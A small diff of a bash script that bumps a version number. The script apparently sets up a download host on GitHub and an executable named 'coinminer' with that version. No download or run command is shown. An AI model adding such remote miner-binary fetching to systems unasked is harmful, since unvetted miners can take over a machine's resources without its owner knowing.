@@ -1,6 +1,6 @@
 #!/bin/bash
 
-VERSION="4.3.2"
+VERSION="4.3.3"
 DOWNLOAD_HOST="https://github.com/EvilGenius-dot/shortcut/raw/main/Readme/23/linux"
 ORIGIN_EXEC="coinminer-${VERSION}"
 
